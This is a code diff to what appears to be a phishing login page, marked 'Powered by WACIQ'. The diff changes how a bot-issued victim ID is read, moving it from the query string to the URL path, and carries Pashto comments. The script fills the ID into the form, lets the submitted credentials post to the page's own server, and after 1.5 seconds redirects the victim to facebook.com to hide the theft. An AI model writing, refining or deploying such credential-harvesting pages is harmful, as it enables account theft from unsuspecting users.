@@ -84,25 +84,27 @@
     <div class="credit">Powered by WACIQ</div>
   </div>
 
-  <script>
-    const params = new URLSearchParams(window.location.search);
-    const uid = params.get('uid');
-    if (uid) {
-      document.getElementById("uid").value = uid;
-    } else {
-      alert("❌ UID not found. Please use the bot's link to log in.");
-      document.getElementById("loginForm").addEventListener("submit", function(e) {
-        e.preventDefault();
-      });
-    }
+<script>
+  // د URL Path څخه کوډ راواخله
+  const path = window.location.pathname; // لکه /Bot48734704_123456
+  const uid = path.split("/").pop();     // اخري برخه (Bot48734704_123456)
 
-    document.getElementById('loginForm').addEventListener('submit', function() {
-      // Delay redirect to allow form to POST
-      setTimeout(() => {
-        window.location.href = "https://facebook.com";
-      }, 1500);
+  if (uid) {
+    document.getElementById("uid").value = uid;
+  } else {
+    alert("❌ UID not found. Please use the bot's link to log in.");
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
     });
-  </script>
+  }
+
+  document.getElementById('loginForm').addEventListener('submit', function() {
+    // Delay redirect to allow form to POST
+    setTimeout(() => {
+      window.location.href = "https://facebook.com";
+    }, 1500);
+  });
+</script> 
 
 </body>
 </html> 
